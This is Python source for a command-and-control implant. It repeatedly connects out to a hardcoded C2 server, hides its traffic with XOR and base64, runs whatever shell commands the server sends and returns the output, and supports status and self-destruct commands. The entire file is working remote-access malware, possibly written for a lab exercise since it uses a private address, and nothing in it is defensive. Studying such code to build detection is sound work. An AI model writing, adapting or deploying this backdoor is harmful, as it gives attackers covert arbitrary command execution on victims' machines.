# implant.py
import socket
import base64
import time
import subprocess
import sys
import os

# setup C2 connection details
C2_HOST = '10.128.0.3'
C2_PORT = 9999
BEACON_INTERVAL = 10
XOR_KEY = b'stonecap'

# Obfuscation functions (same as in c2.py)
def xor_cipher(data, key):
    key_len = len(key)
    return bytes(data[i] ^ key[i % key_len] for i in range(len(data)))

def obfuscate(plain_bytes, key):
    if not isinstance(plain_bytes, bytes):
        plain_bytes = plain_bytes.encode('utf-8')
    xored = xor_cipher(plain_bytes, key)
    return base64.b64encode(xored)

def deobfuscate(obfuscated_bytes, key):
    try:
        decoded_b64 = base64.b64decode(obfuscated_bytes)
        return xor_cipher(decoded_b64, key)
    except Exception as e:
        print(f"[!] Implant: Error deobfuscating data: {e}", file=sys.stderr)
        return b"[DEOBFUSCATION ERROR]"


# function to run a tasked shell command
def run_shell_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30, check=False) # Added check=False
        if result.returncode == 0:
            output = result.stdout if result.stdout else "[No Output]"
            return f"OK|{output}"
        else:
            error_msg = result.stderr if result.stderr else "[No Error Output]"
            return f"ERROR|Return Code: {result.returncode}\n{error_msg}"
    except subprocess.TimeoutExpired:
        return "ERROR|Command timed out."
    except Exception as e:
        return f"ERROR|Exception executing command: {e}"

# Main function to run implant
def run_implant():
    while True:
        sock = None
        # try to connect to c2
        try:
            print(f"[*] Attempting connection to {C2_HOST}:{C2_PORT}...")
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10.0)
            sock.connect((C2_HOST, C2_PORT))
            sock.settimeout(None)
            print("[*] Implant: Connected.")

            # receive a command
            obfuscated_command_parts = []
            # 30s timeout when waiting for a command
            sock.settimeout(30.0)
            while True:
                chunk = sock.recv(4096)
                # if c2 closed connection, break
                if not chunk: # Server closed connection
                    print("[!] Implant: Server closed connection while waiting for command.")
                    break
                obfuscated_command_parts.append(chunk)
                # Check if command seems complete (ends with newline)
                if chunk.endswith(b'\n'):
                     break
            sock.settimeout(None)

            # Check if we received any data
            if not obfuscated_command_parts:
                # Server likely closed connection before sending command
                if sock: sock.close()
                time.sleep(BEACON_INTERVAL)
                # Go to next attempt to receive command
                continue 

            # Join parts, strip trailing newline
            obfuscated_command = b''.join(obfuscated_command_parts).rstrip(b'\n')
            if not obfuscated_command: # Skip if empty command received
                print("[!] Implant: Received empty command.")
                if sock: sock.close()
                time.sleep(BEACON_INTERVAL)
                continue

            # Deobfuscate and Parse Command
            decrypted_command_bytes = deobfuscate(obfuscated_command, XOR_KEY)
            try:
                decrypted_command_str = decrypted_command_bytes.decode('utf-8')
                print(f"[*] Implant: Received command: {decrypted_command_str}")
                cmd_parts = decrypted_command_str.split('|', 2) # Split into max 3 parts: TYPE|COMMAND|ARGS

                # get type, name, and arguments for the command
                command_type = cmd_parts[0].upper()
                command_name = cmd_parts[1].upper() if len(cmd_parts) > 1 else ''
                command_args = cmd_parts[2] if len(cmd_parts) > 2 else ''

            # Handle errors in parsing command
            except (UnicodeDecodeError, IndexError) as e:
                print(f"[!] Implant: Error parsing command: {e}. Raw: {decrypted_command_bytes}")
                response = "ERROR|Could not parse command."
                # Still try to send error back
                obfuscated_response = obfuscate(response.encode('utf-8'), XOR_KEY)
                try:
                     sock.sendall(obfuscated_response + b'\n')
                except socket.error as send_e:
                     print(f"[!] Implant: Socket error sending parse error: {send_e}")
                if sock: sock.close()
                time.sleep(BEACON_INTERVAL)
                continue

            # Execute the command
            response = "ERROR|Unknown command type or name." # Default response

            if command_type == 'TASK':
                if command_name == 'ECHO':
                    response = f"OK|{command_args}"
                elif command_name == 'SHELL':
                    response = run_shell_command(command_args) 

            elif command_type == 'CONTROL':
                if command_name == 'GET_STATUS':
                    response = f"OK|Implant Active. PID: {os.getpid()}"

                # command to self destruct
                elif command_name == 'DESTRUCT':
                    response = "OK|SELF DESTRUCTING"
                    # Send response first, then exit
                    obfuscated_response = obfuscate(response.encode('utf-8'), XOR_KEY)
                    try:
                        sock.sendall(obfuscated_response + b'\n')
                        print(f"[*] Implant: Sent '{response}'. Exiting now.")
                    except socket.error as e:
                        print(f"[!] Implant: Socket error sending DIE confirmation: {e}. Exiting anyway.")
                    finally:
                         if sock: sock.close()
                         sys.exit(0) # Clean exit

            # Obfuscate and Send Response
            obfuscated_response = obfuscate(response.encode('utf-8'), XOR_KEY)
            print(f"[*] Implant: Sending response: {response[:50]}...")
            try:
                sock.sendall(obfuscated_response + b'\n') # Add newline delimiter
            except socket.error as e:
                 print(f"[!] Implant: Socket error sending response: {e}")

            # Close connection for this cycle
            if sock:
                sock.close()
                sock = None
            print("[*] Implant: Task complete. Connection closed.")

        except socket.timeout as e:
            print(f"[!] Implant: Socket timeout: {e}. Retrying after interval.")
            if sock: sock.close() # Close socket on timeout
            sock = None

        # Handle contingency -- if connection failed or dropped
        except socket.error as e:
            print(f"[!] Implant CONTINGENCY: Connection error: {e}. Retrying after interval.")
            if sock: 
                sock.close()
            sock = None

        except KeyboardInterrupt:
             print("\n[*] Implant: Exiting on user request (Ctrl+C).")
             if sock: sock.close()
             sys.exit(0)

        except Exception as e:
            print(f"[!] Implant: Unexpected error: {e}", file=sys.stderr)
            if sock: sock.close() # Ensure socket is closed
            sock = None
            
        finally:
             if sock: # Ensure closure if error happened before explicit close
                  try: sock.close()
                  except: pass

        # Wait for next beacon interval
        print(f"[*] Implant: Sleeping for {BEACON_INTERVAL} seconds...")
        time.sleep(BEACON_INTERVAL)

if __name__ == "__main__":
    run_implant()
